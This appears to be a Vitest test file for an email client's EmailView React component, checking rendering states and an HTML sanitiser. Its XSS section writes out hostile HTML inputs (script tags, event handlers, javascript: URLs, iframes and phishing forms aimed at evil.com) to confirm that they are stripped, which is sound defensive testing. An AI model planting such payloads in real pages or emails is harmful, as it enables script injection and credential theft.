import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import EmailView from '../EmailView';
import { Email, INBOX_FOLDER } from '../../types';

// Mock window.electron
const mockGetEmailAttachments = vi.fn();

/**
 * Helper: wait for the iframe to appear and return its srcdoc content.
 * Used by XSS tests that verify sanitised HTML rendered inside the iframe.
 */
async function waitForSrcDoc(): Promise<string> {
  let srcDoc = '';
  await waitFor(() => {
    const iframe = document.querySelector('iframe[title="Email content"]');
    expect(iframe).toBeTruthy();
    srcDoc = iframe?.getAttribute('srcdoc') || '';
    expect(srcDoc.length).toBeGreaterThan(0);
  });
  return srcDoc;
}

describe('EmailView', () => {
  // Sample email factory
  const createEmail = (overrides: Partial<Email> = {}): Email => ({
    id: 'email-1',
    sender: 'John Doe',
    senderEmail: 'john@example.com',
    subject: 'Test Subject',
    body: 'This is the plain text email body content.',
    date: '2024-01-15T10:30:00Z',
    folder: INBOX_FOLDER,
    category: 'INBOX',
    isRead: false,
    isFlagged: false,
    hasAttachments: false,
    ...overrides,
  });

  beforeEach(() => {
    vi.clearAllMocks();
    // Setup window.electron mock
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (window.electron as any) = {
      getEmailAttachments: mockGetEmailAttachments,
    };
  });

  afterEach(() => {
    // Clean up window.electron mock
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    delete (window as any).electron;
  });

  describe('Empty State', () => {
    it('should render empty state icon when no email is selected', () => {
      render(<EmailView email={null} />);

      // CategoryIcon should be present with specific styling
      const icon = document.querySelector('svg.w-16.h-16.opacity-20');
      expect(icon).toBeInTheDocument();
    });

    it('should render empty state heading when no email is selected', () => {
      render(<EmailView email={null} />);

      expect(screen.getByText('Keine Email ausgewählt')).toBeInTheDocument();
    });

    it('should render empty state description when no email is selected', () => {
      render(<EmailView email={null} />);

      expect(screen.getByText('Wähle eine Email aus der Liste aus, um den Inhalt anzuzeigen.')).toBeInTheDocument();
    });

    it('should center align empty state content', () => {
      render(<EmailView email={null} />);

      const emptyStateContainer = screen.getByText('Keine Email ausgewählt').closest('div');
      expect(emptyStateContainer).toHaveClass('text-center');
    });

    it('should not render any email content when email is null', () => {
      render(<EmailView email={null} />);

      expect(screen.queryByText('Test Subject')).not.toBeInTheDocument();
      expect(screen.queryByText('John Doe')).not.toBeInTheDocument();
    });

    it('should apply proper styling to empty state container', () => {
      const { container } = render(<EmailView email={null} />);

      // Should have the empty state container
      const emptyStateRoot = container.querySelector('[data-testid="empty-state"]');
      expect(emptyStateRoot).toBeInTheDocument();
    });
  });

  describe('Loading State', () => {
    it('should render loading spinner when body is undefined', () => {
      const loadingEmail = createEmail({
        body: undefined as unknown as string,
        bodyHtml: undefined,
      });
      render(<EmailView email={loadingEmail} />);

      expect(screen.getByText('Lade Inhalt...')).toBeInTheDocument();
    });

    it('should show loading animation when content is not loaded', () => {
      const loadingEmail = createEmail({
        body: undefined as unknown as string,
        bodyHtml: undefined,
      });
      render(<EmailView email={loadingEmail} />);

      const spinner = document.querySelector('.animate-spin');
      expect(spinner).toBeInTheDocument();
    });

    it('should not show email header when loading', () => {
      const loadingEmail = createEmail({
        body: undefined as unknown as string,
        bodyHtml: undefined,
      });
      render(<EmailView email={loadingEmail} />);

      expect(screen.queryByText('Test Subject')).not.toBeInTheDocument();
    });
  });

  describe('Email Header', () => {
    it('should render email subject', () => {
      const email = createEmail({ subject: 'Important Meeting Tomorrow' });
      render(<EmailView email={email} />);

      expect(screen.getByText('Important Meeting Tomorrow')).toBeInTheDocument();
    });

    it('should render sender name', () => {
      const email = createEmail({ sender: 'Alice Smith' });
      render(<EmailView email={email} />);

      expect(screen.getByText('Alice Smith')).toBeInTheDocument();
    });

    it('should render sender email in angle brackets', () => {
      const email = createEmail({ senderEmail: 'alice@company.com' });
      render(<EmailView email={email} />);

      expect(screen.getByText('<alice@company.com>')).toBeInTheDocument();
    });

    it('should render sender initial avatar', () => {
      const email = createEmail({ sender: 'Bob Wilson' });
      render(<EmailView email={email} />);

      // Avatar shows first letter of sender name
      expect(screen.getByText('B')).toBeInTheDocument();
    });

    it('should render formatted date', () => {
      const email = createEmail({ date: '2024-01-15T10:30:00Z' });
      render(<EmailView email={email} />);

      // Date should be formatted using toLocaleString()
      const formattedDate = new Date('2024-01-15T10:30:00Z').toLocaleString();
      expect(screen.getByText(formattedDate)).toBeInTheDocument();
    });

    it('should render email category', () => {
      const email = createEmail({ category: 'Rechnungen' });
      render(<EmailView email={email} />);

      expect(screen.getByText('Rechnungen')).toBeInTheDocument();
    });
  });

  describe('AI Confidence Display', () => {
    it('should render AI confidence percentage when present', () => {
      const email = createEmail({ confidence: 0.95 });
      render(<EmailView email={email} />);

      expect(screen.getByText('AI Confidence')).toBeInTheDocument();
      expect(screen.getByText('95%')).toBeInTheDocument();
    });

    it('should round confidence to nearest integer', () => {
      const email = createEmail({ confidence: 0.867 });
      render(<EmailView email={email} />);

      expect(screen.getByText('87%')).toBeInTheDocument();
    });

    it('should not render AI confidence when not present', () => {
      const email = createEmail({ confidence: undefined });
      render(<EmailView email={email} />);

      expect(screen.queryByText('AI Confidence')).not.toBeInTheDocument();
    });

    it('should handle 100% confidence', () => {
      const email = createEmail({ confidence: 1.0 });
      render(<EmailView email={email} />);

      expect(screen.getByText('100%')).toBeInTheDocument();
    });

    it('should handle low confidence values', () => {
      const email = createEmail({ confidence: 0.12 });
      render(<EmailView email={email} />);

      expect(screen.getByText('12%')).toBeInTheDocument();
    });
  });

  describe('Attachments', () => {
    it('should load attachments when email has attachments flag', async () => {
      const email = createEmail({ hasAttachments: true });
      mockGetEmailAttachments.mockResolvedValue([{ id: 'att-1', filename: 'document.pdf', size: 1024 }]);

      render(<EmailView email={email} />);

      await waitFor(() => {
        expect(mockGetEmailAttachments).toHaveBeenCalledWith('email-1');
      });
    });

    it('should render attachment filenames', async () => {
      const email = createEmail({ hasAttachments: true });
      mockGetEmailAttachments.mockResolvedValue([{ id: 'att-1', filename: 'document.pdf', size: 1024 }]);

      render(<EmailView email={email} />);

      await waitFor(() => {
        expect(screen.getByText('document.pdf')).toBeInTheDocument();
      });
    });

    it('should render multiple attachments', async () => {
      const email = createEmail({ hasAttachments: true });
      mockGetEmailAttachments.mockResolvedValue([
        { id: 'att-1', filename: 'document.pdf', size: 1024 },
        { id: 'att-2', filename: 'image.png', size: 2048 },
        { id: 'att-3', filename: 'spreadsheet.xlsx', size: 4096 },
      ]);

      render(<EmailView email={email} />);

      await waitFor(() => {
        expect(screen.getByText('document.pdf')).toBeInTheDocument();
        expect(screen.getByText('image.png')).toBeInTheDocument();
        expect(screen.getByText('spreadsheet.xlsx')).toBeInTheDocument();
      });
    });

    it('should display attachment size in title', async () => {
      const email = createEmail({ hasAttachments: true });
      mockGetEmailAttachments.mockResolvedValue([{ id: 'att-1', filename: 'document.pdf', size: 2048 }]);

      render(<EmailView email={email} />);

      await waitFor(() => {
        const attachmentElement = screen.getByText('document.pdf').closest('div');
        expect(attachmentElement).toHaveAttribute('title', 'Size: 2.0 KB');
      });
    });

    it('should not load attachments when hasAttachments is false', () => {
      const email = createEmail({ hasAttachments: false });
      render(<EmailView email={email} />);

      expect(mockGetEmailAttachments).not.toHaveBeenCalled();
    });

    it('should not load attachments when window.electron is not available', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      delete (window as any).electron;
      const email = createEmail({ hasAttachments: true });
      render(<EmailView email={email} />);

      expect(mockGetEmailAttachments).not.toHaveBeenCalled();
    });

    it('should handle attachment loading error gracefully', async () => {
      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const email = createEmail({ hasAttachments: true });
      mockGetEmailAttachments.mockRejectedValue(new Error('Network error'));

      render(<EmailView email={email} />);

      await waitFor(() => {
        expect(consoleSpy).toHaveBeenCalled();
      });

      // Component should still render without crashing
      expect(screen.getByText('Test Subject')).toBeInTheDocument();
      consoleSpy.mockRestore();
    });

    it('should clear attachments when switching to email without attachments', async () => {
      const emailWithAttachments = createEmail({ id: 'email-1', hasAttachments: true });
      mockGetEmailAttachments.mockResolvedValue([{ id: 'att-1', filename: 'document.pdf', size: 1024 }]);

      const { rerender } = render(<EmailView email={emailWithAttachments} />);

      await waitFor(() => {
        expect(screen.getByText('document.pdf')).toBeInTheDocument();
      });

      // Switch to email without attachments
      const emailWithoutAttachments = createEmail({ id: 'email-2', hasAttachments: false });
      rerender(<EmailView email={emailWithoutAttachments} />);

      await waitFor(() => {
        expect(screen.queryByText('document.pdf')).not.toBeInTheDocument();
      });
    });
  });

  describe('AI Analysis Box', () => {
    it('should render AI reasoning when present', () => {
      const email = createEmail({
        aiReasoning: 'This email appears to be an invoice based on keywords like "payment" and "amount due".',
      });
      render(<EmailView email={email} />);

      expect(screen.getByText('Gemini Analyse')).toBeInTheDocument();
      expect(
        screen.getByText('This email appears to be an invoice based on keywords like "payment" and "amount due".')
      ).toBeInTheDocument();
    });

    it('should not render AI analysis section when aiReasoning is not present', () => {
      const email = createEmail({ aiReasoning: undefined });
      render(<EmailView email={email} />);

      expect(screen.queryByText('Gemini Analyse')).not.toBeInTheDocument();
    });

    it('should not render AI analysis section when aiReasoning is empty string', () => {
      const email = createEmail({ aiReasoning: '' });
      render(<EmailView email={email} />);

      expect(screen.queryByText('Gemini Analyse')).not.toBeInTheDocument();
    });

    it('should render long AI reasoning text', () => {
      const longReasoning = 'A'.repeat(500);
      const email = createEmail({ aiReasoning: longReasoning });
      render(<EmailView email={email} />);

      expect(screen.getByText(longReasoning)).toBeInTheDocument();
    });
  });

  describe('View Toggle (Text/HTML)', () => {
    it('should render view toggle when email has HTML body', () => {
      const email = createEmail({
        body: 'Plain text body',
        bodyHtml: '<p>HTML body</p>',
      });
      render(<EmailView email={email} />);

      expect(screen.getByText('Text')).toBeInTheDocument();
      expect(screen.getByText('HTML')).toBeInTheDocument();
    });

    it('should not render view toggle when email has no HTML body', () => {
      const email = createEmail({
        body: 'Plain text body',
        bodyHtml: undefined,
      });
      render(<EmailView email={email} />);

      expect(screen.queryByRole('button', { name: 'Text' })).not.toBeInTheDocument();
      expect(screen.queryByRole('button', { name: 'HTML' })).not.toBeInTheDocument();
    });

    it('should default to HTML view when available', () => {
      const email = createEmail({
        body: 'Plain text body',
        bodyHtml: '<p>HTML body content</p>',
      });
      render(<EmailView email={email} />);

      // HTML button should have active styling
      const htmlButton = screen.getByText('HTML');
      expect(htmlButton).toHaveClass('bg-blue-100');
    });

    it('should switch to text view when Text button is clicked', () => {
      const email = createEmail({
        body: 'Plain text body content',
        bodyHtml: '<p>HTML body content</p>',
      });
      render(<EmailView email={email} />);

      const textButton = screen.getByText('Text');
      fireEvent.click(textButton);

      // Text button should now have active styling
      expect(textButton).toHaveClass('bg-blue-100');
      // Plain text body should be visible
      expect(screen.getByText('Plain text body content')).toBeInTheDocument();
    });

    it('should switch back to HTML view when HTML button is clicked', () => {
      const email = createEmail({
        body: 'Plain text body content',
        bodyHtml: '<p>HTML body content</p>',
      });
      render(<EmailView email={email} />);

      // First switch to text
      fireEvent.click(screen.getByText('Text'));
      // Then back to HTML
      fireEvent.click(screen.getByText('HTML'));

      const htmlButton = screen.getByText('HTML');
      expect(htmlButton).toHaveClass('bg-blue-100');
    });

    it('should reset to HTML view when email changes', async () => {
      const email1 = createEmail({
        id: 'email-1',
        body: 'First email text',
        bodyHtml: '<p>First email HTML</p>',
      });
      const email2 = createEmail({
        id: 'email-2',
        body: 'Second email text',
        bodyHtml: '<p>Second email HTML</p>',
      });

      const { rerender } = render(<EmailView email={email1} />);

      // Switch to text view
      fireEvent.click(screen.getByText('Text'));
      expect(screen.getByText('Text')).toHaveClass('bg-blue-100');

      // Change email
      rerender(<EmailView email={email2} />);

      // Should reset to HTML view
      await waitFor(() => {
        expect(screen.getByText('HTML')).toHaveClass('bg-blue-100');
      });
    });
  });

  describe('Email Body Content', () => {
    it('should render plain text body when no HTML available', () => {
      const email = createEmail({
        body: 'This is the plain text email body.',
        bodyHtml: undefined,
      });
      render(<EmailView email={email} />);

      expect(screen.getByText('This is the plain text email body.')).toBeInTheDocument();
    });

    it('should render HTML body in iframe when available and showHtml is true', async () => {
      const email = createEmail({
        body: 'Plain text',
        bodyHtml: '<strong>Bold HTML content</strong>',
      });
      render(<EmailView email={email} />);

      // Wait for async sanitization to complete and iframe to appear
      await waitFor(() => {
        const iframe = document.querySelector('iframe[title="Email content"]');
        expect(iframe).toBeInTheDocument();
      });
    });

    it('should render plain text when showHtml is false', () => {
      const email = createEmail({
        body: 'Plain text body content here',
        bodyHtml: '<p>HTML body content</p>',
      });
      render(<EmailView email={email} />);

      fireEvent.click(screen.getByText('Text'));

      expect(screen.getByText('Plain text body content here')).toBeInTheDocument();
    });

    it('should preserve whitespace in plain text body', () => {
      const email = createEmail({
        body: 'Line 1\n\nLine 3',
        bodyHtml: undefined,
      });
      render(<EmailView email={email} />);

      // Find the body element with whitespace-pre-wrap class
      const bodyElement = document.querySelector('.whitespace-pre-wrap');
      expect(bodyElement).toBeInTheDocument();
      expect(bodyElement).toHaveTextContent('Line 1');
      expect(bodyElement).toHaveTextContent('Line 3');
      expect(bodyElement).toHaveClass('whitespace-pre-wrap');
    });

    it('should handle empty body gracefully', () => {
      const email = createEmail({
        body: '',
        bodyHtml: undefined,
      });
      render(<EmailView email={email} />);

      // Component should render without crashing
      expect(screen.getByText('Test Subject')).toBeInTheDocument();
    });

    it('should show plain text when bodyHtml is empty string', () => {
      const email = createEmail({
        body: 'Fallback plain text',
        bodyHtml: '',
      });
      render(<EmailView email={email} />);

      // Empty string is falsy, so no toggle should appear
      expect(screen.queryByRole('button', { name: 'Text' })).not.toBeInTheDocument();
      expect(screen.getByText('Fallback plain text')).toBeInTheDocument();
    });
  });

  describe('Edge Cases', () => {
    it('should handle email with very long subject', () => {
      const longSubject = 'A'.repeat(300);
      const email = createEmail({ subject: longSubject });
      render(<EmailView email={email} />);

      expect(screen.getByText(longSubject)).toBeInTheDocument();
    });

    it('should handle email with special characters in subject', () => {
      const email = createEmail({
        subject: '<script>alert("XSS")</script> & "quotes"',
      });
      render(<EmailView email={email} />);

      // React escapes HTML entities
      expect(screen.getByText('<script>alert("XSS")</script> & "quotes"')).toBeInTheDocument();
    });

    it('should handle email with unicode characters', () => {
      const email = createEmail({
        subject: '🎉 Wichtige Mitteilung 日本語',
        sender: 'Müller, Hans 田中',
      });
      render(<EmailView email={email} />);

      expect(screen.getByText('🎉 Wichtige Mitteilung 日本語')).toBeInTheDocument();
      expect(screen.getByText('Müller, Hans 田中')).toBeInTheDocument();
    });

    it('should handle email with sender starting with number', () => {
      const email = createEmail({ sender: '1-800-FLOWERS' });
      render(<EmailView email={email} />);

      // Avatar should show first character
      const avatar = document.querySelector('.rounded-full.bg-blue-100');
      expect(avatar).toHaveTextContent('1');
    });

    it('should handle email with empty sender name', () => {
      const email = createEmail({ sender: '' });
      render(<EmailView email={email} />);

      // Should not crash - empty string charAt(0) returns ''
      expect(screen.getByText('Test Subject')).toBeInTheDocument();
    });

    it('should handle email with minimal data', () => {
      const minimalEmail: Email = {
        id: 'min-1',
        sender: 'X',
        senderEmail: 'x@y.z',
        subject: 'S',
        body: 'B',
        date: '2024-01-01T00:00:00Z',
        folder: 'Inbox',
        isRead: true,
        isFlagged: false,
      };
      render(<EmailView email={minimalEmail} />);

      // Avatar shows sender initial
      const avatar = document.querySelector('.rounded-full.bg-blue-100');
      expect(avatar).toHaveTextContent('X');
      // Subject in heading
      expect(screen.getByRole('heading', { name: 'S' })).toBeInTheDocument();
      // Body in content area
      const bodyContainer = document.querySelector('.prose.prose-slate.whitespace-pre-wrap');
      expect(bodyContainer).toHaveTextContent('B');
    });

    it('should handle null category gracefully', () => {
      const email = createEmail({ category: undefined });
      render(<EmailView email={email} />);

      // Component should render without crashing
      expect(screen.getByText('Test Subject')).toBeInTheDocument();
    });
  });

  describe('Email Switching', () => {
    it('should update content when email changes', () => {
      const email1 = createEmail({ id: 'email-1', subject: 'First Email Subject' });
      const email2 = createEmail({ id: 'email-2', subject: 'Second Email Subject' });

      const { rerender } = render(<EmailView email={email1} />);
      expect(screen.getByText('First Email Subject')).toBeInTheDocument();

      rerender(<EmailView email={email2} />);
      expect(screen.getByText('Second Email Subject')).toBeInTheDocument();
      expect(screen.queryByText('First Email Subject')).not.toBeInTheDocument();
    });

    it('should reload attachments when switching emails', async () => {
      const email1 = createEmail({ id: 'email-1', hasAttachments: true });
      const email2 = createEmail({ id: 'email-2', hasAttachments: true });

      mockGetEmailAttachments
        .mockResolvedValueOnce([{ id: 'att-1', filename: 'first.pdf', size: 1024 }])
        .mockResolvedValueOnce([{ id: 'att-2', filename: 'second.pdf', size: 2048 }]);

      const { rerender } = render(<EmailView email={email1} />);

      await waitFor(() => {
        expect(mockGetEmailAttachments).toHaveBeenCalledWith('email-1');
      });

      rerender(<EmailView email={email2} />);

      await waitFor(() => {
        expect(mockGetEmailAttachments).toHaveBeenCalledWith('email-2');
      });
    });

    it('should show empty state when switching from email to null', () => {
      const email = createEmail();
      const { rerender } = render(<EmailView email={email} />);

      expect(screen.getByText('Test Subject')).toBeInTheDocument();

      rerender(<EmailView email={null} />);

      expect(screen.getByText('Wähle eine Email aus der Liste aus, um den Inhalt anzuzeigen.')).toBeInTheDocument();
      expect(screen.queryByText('Test Subject')).not.toBeInTheDocument();
    });
  });

  describe('Styling and Layout', () => {
    it('should apply prose styling to body content', () => {
      const email = createEmail({ body: 'Body content' });
      render(<EmailView email={email} />);

      const bodyContainer = screen.getByText('Body content').closest('div');
      expect(bodyContainer).toHaveClass('prose');
    });

    it('should have overflow handling for long emails', () => {
      const email = createEmail();
      render(<EmailView email={email} />);

      const scrollContainer = document.querySelector('.overflow-y-auto');
      expect(scrollContainer).toBeInTheDocument();
    });

    it('should render AI analysis with gradient background', () => {
      const email = createEmail({
        aiReasoning: 'AI analysis text',
      });
      render(<EmailView email={email} />);

      const analysisBox = screen.getByText('AI analysis text').closest('div[class*="gradient"]');
      expect(analysisBox).toHaveClass('bg-gradient-to-r');
    });
  });

  describe('Accessibility', () => {
    it('should have heading for email subject', () => {
      const email = createEmail({ subject: 'Important Email' });
      render(<EmailView email={email} />);

      const heading = screen.getByRole('heading', { name: 'Important Email' });
      expect(heading).toBeInTheDocument();
    });

    it('should have clickable toggle buttons for text/html', () => {
      const email = createEmail({
        body: 'Text',
        bodyHtml: '<p>HTML</p>',
      });
      render(<EmailView email={email} />);

      const textButton = screen.getByRole('button', { name: 'Text' });
      const htmlButton = screen.getByRole('button', { name: 'HTML' });

      expect(textButton).toBeInTheDocument();
      expect(htmlButton).toBeInTheDocument();
    });

    it('should indicate active view toggle visually', () => {
      const email = createEmail({
        body: 'Text',
        bodyHtml: '<p>HTML</p>',
      });
      render(<EmailView email={email} />);

      // HTML should be active by default
      const htmlButton = screen.getByRole('button', { name: 'HTML' });
      expect(htmlButton).toHaveClass('font-medium');

      // Text should not be active
      const textButton = screen.getByRole('button', { name: 'Text' });
      expect(textButton).not.toHaveClass('font-medium');
    });
  });

  describe('XSS Security Protection', () => {
    // All XSS tests verify sanitized HTML in the iframe's srcdoc attribute,
    // since the component renders HTML email content inside an iframe after
    // asynchronous sanitization via setTimeout(0).

    describe('Script Injection Prevention', () => {
      it('should remove <script> tags from HTML email content', async () => {
        const maliciousEmail = createEmail({
          body: 'Plain text',
          bodyHtml: '<p>Safe content</p><script>alert("XSS")</script><p>More content</p>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<script>');
        expect(srcDoc).not.toContain('alert(');
        expect(srcDoc).toContain('Safe content');
        expect(srcDoc).toContain('More content');
      });

      it('should remove script tags with attributes', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Content</p><script type="text/javascript" src="evil.js"></script>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<script');
        expect(srcDoc).not.toContain('evil.js');
        expect(srcDoc).toContain('Content');
      });

      it('should remove script tags with various casing', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Safe</p><ScRiPt>alert("XSS")</ScRiPt>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toMatch(/<script/i);
        expect(srcDoc).not.toContain('alert(');
      });

      it('should remove multiple nested script tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<div><script>alert(1)</script><p>Safe</p><span><script>alert(2)</script></span></div>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<script>');
        expect(srcDoc).not.toContain('alert(');
        expect(srcDoc).toContain('Safe');
      });
    });

    describe('Event Handler Injection Prevention', () => {
      it('should remove onerror event handlers from img tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Image:</p><img src="valid.jpg" onerror="alert(\'XSS\')">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onerror');
        expect(srcDoc).not.toContain('alert(');
        // Image should still be present (without the handler)
        expect(srcDoc).toContain('<img');
      });

      it('should remove onclick event handlers from links', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<a href="#" onclick="alert(\'XSS\')">Click me</a>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onclick');
        expect(srcDoc).not.toContain('alert(');
        expect(srcDoc).toContain('Click me');
      });

      it('should remove onload event handlers', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<body onload="alert(\'XSS\')">Content</body>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onload');
        expect(srcDoc).not.toContain('alert(');
      });

      it('should remove onmouseover event handlers', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<div onmouseover="alert(\'XSS\')">Hover me</div>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onmouseover');
        expect(srcDoc).not.toContain('alert(');
        expect(srcDoc).toContain('Hover me');
      });

      it('should remove onfocus event handlers from inputs', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Text:</p><input type="text" onfocus="alert(\'XSS\')" value="test">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onfocus');
        expect(srcDoc).not.toContain('alert(');
      });

      it('should remove multiple different event handlers', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<div onclick="bad1()" onmouseover="bad2()" onload="bad3()">Content</div>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('onclick');
        expect(srcDoc).not.toContain('onmouseover');
        expect(srcDoc).not.toContain('onload');
        expect(srcDoc).not.toContain('bad1');
        expect(srcDoc).not.toContain('bad2');
        expect(srcDoc).not.toContain('bad3');
      });
    });

    describe('Iframe Injection Prevention', () => {
      it('should remove iframe tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Content</p><iframe src="https://evil.com"></iframe>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        // Check the srcdoc doesn't contain injected iframe (not counting the outer iframe element)
        expect(srcDoc).not.toContain('<iframe');
        expect(srcDoc).not.toContain('evil.com');
        expect(srcDoc).toContain('Content');
      });

      it('should remove iframes with javascript: URLs', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<iframe');
        expect(srcDoc).not.toContain('javascript:');
        expect(srcDoc).not.toContain('alert(');
      });

      it('should remove nested iframes', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<div><iframe src="evil1.com"><iframe src="evil2.com"></iframe></iframe></div>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<iframe');
        expect(srcDoc).not.toContain('evil1.com');
        expect(srcDoc).not.toContain('evil2.com');
      });
    });

    describe('JavaScript URL Prevention', () => {
      it('should remove javascript: URLs from links', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<a href="javascript:alert(\'XSS\')">Click</a>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('javascript:');
        expect(srcDoc).not.toContain('alert(');
      });

      it('should remove javascript: URLs from images', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<img src="javascript:alert(\'XSS\')">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('javascript:');
        expect(srcDoc).not.toContain('alert(');
      });

      it('should remove data:text/html URLs', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<a href="data:text/html,<script>alert(\'XSS\')</script>">Link</a>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('data:text/html');
        expect(srcDoc).not.toContain('<script>');
      });
    });

    describe('CSS Injection Prevention', () => {
      it('should remove inline style attributes', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<div style="background: url(javascript:alert(\'XSS\'))">Content</div>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('style=');
        expect(srcDoc).not.toContain('javascript:');
        expect(srcDoc).toContain('Content');
      });

      it('should remove style tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<style>body { background: url("javascript:alert(\'XSS\')"); }</style><p>Content</p>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        // The srcdoc may have its own <style> for iframe styling, but should not contain the injected one
        expect(srcDoc).not.toContain('javascript:');
        expect(srcDoc).toContain('Content');
      });
    });

    describe('Form Element Injection Prevention', () => {
      it('should remove form tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<form action="https://evil.com/phish"><input type="password"></form>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<form');
        expect(srcDoc).not.toContain('evil.com');
      });

      it('should remove input elements', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Enter password:</p><input type="password" name="pass">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<input');
        expect(srcDoc).toContain('Enter password:');
      });

      it('should remove button elements', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<p>Legit text</p><button onclick="steal()">Click me</button>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<button');
        expect(srcDoc).not.toContain('steal()');
        expect(srcDoc).not.toContain('onclick');
        expect(srcDoc).toContain('Legit text');
      });
    });

    describe('Dangerous Element Prevention', () => {
      it('should remove object tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<object data="evil.swf"></object>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<object');
        expect(srcDoc).not.toContain('evil.swf');
      });

      it('should remove embed tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<embed src="evil.swf">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<embed');
        expect(srcDoc).not.toContain('evil.swf');
      });

      it('should remove applet tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<applet code="EvilApplet.class"></applet>',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).not.toContain('<applet');
        expect(srcDoc).not.toContain('EvilApplet');
      });

      it('should remove meta tags', async () => {
        const maliciousEmail = createEmail({
          bodyHtml: '<meta http-equiv="refresh" content="0;url=https://evil.com">',
        });

        render(<EmailView email={maliciousEmail} />);

        const srcDoc = await waitForSrcDoc();
        // The iframe wrapper includes its own <meta charset="utf-8">, so check
        // that the malicious meta (http-equiv/refresh) was stripped, not all <meta> tags
        expect(srcDoc).not.toContain('http-equiv');
        expect(srcDoc).not.toContain('evil.com');
      });
    });

    describe('Safe HTML Preservation', () => {
      it('should preserve safe text formatting', async () => {
        const safeEmail = createEmail({
          bodyHtml: '<p>Normal text with <strong>bold</strong>, <em>italic</em>, and <u>underline</u></p>',
        });

        render(<EmailView email={safeEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).toContain('<strong>bold</strong>');
        expect(srcDoc).toContain('<em>italic</em>');
        expect(srcDoc).toContain('<u>underline</u>');
      });

      it('should preserve safe links without event handlers', async () => {
        const safeEmail = createEmail({
          bodyHtml: '<p>Visit <a href="https://example.com">our website</a></p>',
        });

        render(<EmailView email={safeEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).toContain('our website');
        expect(srcDoc).toContain('href="https://example.com"');
      });

      it('should preserve lists', async () => {
        const safeEmail = createEmail({
          bodyHtml: '<ul><li>Item 1</li><li>Item 2</li><li>Item 3</li></ul>',
        });

        render(<EmailView email={safeEmail} />);

        const srcDoc = await waitForSrcDoc();
        expect(srcDoc).toContain('Item 1');
        expect(srcDoc).toContain('Item 2');
        expect(srcDoc).toContain('Item 3');
